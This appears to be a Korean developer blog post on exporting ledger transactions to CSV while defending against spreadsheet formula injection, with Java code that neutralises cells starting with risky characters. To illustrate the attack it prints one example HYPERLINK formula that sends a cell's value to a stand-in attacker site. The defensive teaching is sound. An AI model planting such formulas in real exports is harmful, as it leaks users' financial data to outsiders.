---
title: "CSV 내보내기와 수식 주입 방어"
slug: "ledger-auth-csv-injection"
category: "development"
publishedAt: "2026-10-08"
summary: "거래 내역을 엑셀에서 바로 열리는 CSV로 내보내는 코드와, 셀 값이 =로 시작할 때 엑셀이 수식으로 실행하는 CSV 수식 주입을 막는 방법, 한글이 깨지지 않게 하는 BOM을 설명합니다."
series: "ledger"
chapter: "auth"
seriesOrder: 5
---
## 이 글에서 할 일

설정 화면에서 기간을 골라 거래 내역을 CSV 파일로 내려받을 수 있습니다. 엑셀에서 열어 보는 용도입니다. 단순한 기능 같지만 **엑셀이 셀을 수식으로 실행하는** 보안 문제가 있습니다.

## CSV 수식 주입이란

엑셀과 구글 시트는 `=`, `+`, `-`, `@`로 시작하는 셀을 **수식**으로 실행합니다. 거래 내용에 다음 값을 넣었다고 해 봅시다.

```text
=HYPERLINK("https://공격자사이트/?d="&A1, "클릭")
```

CSV로 내보내 엑셀에서 열면 이 셀은 링크가 되고, 누르면 옆 셀 값이 공격자에게 전송될 수 있습니다. 더 위험한 수식도 있습니다. 이것을 **CSV 수식 주입**(Formula Injection, CSV Injection)이라고 합니다.

## 방어: 위험한 첫 글자 앞에 작은따옴표

`ledger/cmmn/util/CsvUtil.java`

```java
// CSV 셀·줄 만들기(RFC 4180 + 스프레드시트 수식 주입 방지)
public class CsvUtil {

    private static final String FORMULA_START = "=+-@\t\r";

    // = + - @ 탭·CR 로 시작하면 앞에 ' 를 붙여 엑셀 등이 수식으로 실행하지 않게 하고,
    // 쉼표·따옴표·줄바꿈이 있으면 따옴표로 감싼다(안의 " 는 "")
    public static String cell(Object value) {
        String s = value == null ? "" : String.valueOf(value);
        if (!s.isEmpty() && FORMULA_START.indexOf(s.charAt(0)) >= 0) {
            s = "'" + s;
        }
        if (s.contains(",") || s.contains("\"") || s.contains("\n") || s.contains("\r")) {
            s = "\"" + s.replace("\"", "\"\"") + "\"";
        }
        return s;
    }

    public static String line(List<?> values) {
        return values.stream().map(CsvUtil::cell).collect(Collectors.joining(",")) + "\r\n";
    }
}
```

### 1단계. 수식 막기

첫 글자가 `= + - @ 탭 CR` 중 하나면 앞에 `'`(작은따옴표)를 붙입니다. 엑셀은 `'`로 시작하는 셀을 **글자**로 다룹니다.

### 2단계. CSV 형식 지키기 (RFC 4180)

CSV는 쉼표로 칸을 나누므로, 값 안에 쉼표가 있으면 칸이 밀립니다.

| 값 | 그대로 쓰면 | `cell()` 결과 |
|---|---|---|
| `점심, 커피` | 두 칸으로 나뉨 | `"점심, 커피"` |
| `말했다 "좋아"` | 따옴표가 깨짐 | `"말했다 ""좋아"""` |
| 줄바꿈이 있는 메모 | 다음 줄로 넘어감 | `"첫 줄↵둘째 줄"` |

쉼표, 따옴표, 줄바꿈이 있으면 전체를 `"`로 감싸고, 안의 `"`는 `""`로 두 번 씁니다. CSV 표준(RFC 4180)의 규칙이며 줄 끝도 표준대로 `\r\n`입니다.

이 변환은 `CsvUtilTest`로 검사합니다.

![설정 화면의 기록 내보내기. 이번 주기, 이번 달, 지난달, 올해 버튼과 시작일, 종료일, CSV 내보내기 버튼이 있다](/uploads/capture-ledger-13-csv-settings.jpg)

## 내보내기 Controller

`SettingsApiController.export` (일부)

```java
// 거래 CSV 내보내기(파일 다운로드, 읽기 전용이라 GET). 기간 오류는 400 오류 화면
@GetMapping("/export")
// 파라미터 이름을 명시한다(-parameters 없이 컴파일돼 이름을 알 수 없으면 500)
public void export(@RequestParam("from") String from, @RequestParam("to") String to, HttpSession session,
                   HttpServletResponse response) throws IOException {
    ...
    if (fromDate == null || toDate == null || fromDate.isAfter(toDate) || fromDate.plusYears(EXPORT_MAX_YEARS).isBefore(toDate)) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "내보내기 기간 오류");
    }
    ...
    response.setContentType("text/csv; charset=UTF-8");
    response.setHeader("Content-Disposition", "attachment; filename=\"ledger-" + fromDate + "-" + toDate + ".csv\"");
    response.setHeader("Cache-Control", "no-store");
    Writer writer = response.getWriter();
    writer.write('﻿');   // 엑셀이 UTF-8 한글을 알아보도록 BOM
    writer.write(CsvUtil.line(List.of("날짜", "구분", "카테고리", "내용", "금액", "결제수단", "메모")));
    for (Map<String, Object> e : entries) {
        writer.write(CsvUtil.line(...));
    }
    writer.flush();
}
```

| 부분 | 뜻 |
|---|---|
| `@GetMapping` | 파일 다운로드는 브라우저 주소 이동으로 받으므로 GET. 데이터를 바꾸지 않아 CSRF 대상이 아님 |
| 기간 검사 | 시작일이 끝일보다 늦거나 10년을 넘으면 400. 너무 큰 내보내기로 서버를 괴롭히는 것을 막음 |
| `Content-Disposition: attachment` | 화면에 띄우지 않고 파일로 저장 |
| `Cache-Control: no-store` | 개인 금융 기록이 브라우저나 중간 서버 캐시에 남지 않게 |
| BOM (`﻿`) | 파일 맨 앞의 표시. 엑셀이 이 파일을 UTF-8로 읽어 한글이 깨지지 않음 |
| `userId`는 세션에서 | 다른 사람의 기록을 내보낼 수 없음 |

`@RequestParam("from")`처럼 이름을 직접 적은 데는 사연이 있습니다. [CSV 내보내기 500 오류](/posts/ledger-troubleshooting-csv-500)에서 다룹니다.

## 정리

- 엑셀은 `=`, `+`, `-`, `@`로 시작하는 셀을 수식으로 실행하므로, 앞에 `'`를 붙여 글자로 만듭니다.
- 쉼표, 따옴표, 줄바꿈은 RFC 4180 규칙대로 따옴표로 감쌉니다.
- 파일 앞에 BOM을 넣어 엑셀에서 한글이 깨지지 않게 하고, `no-store`로 캐시에 남기지 않습니다.
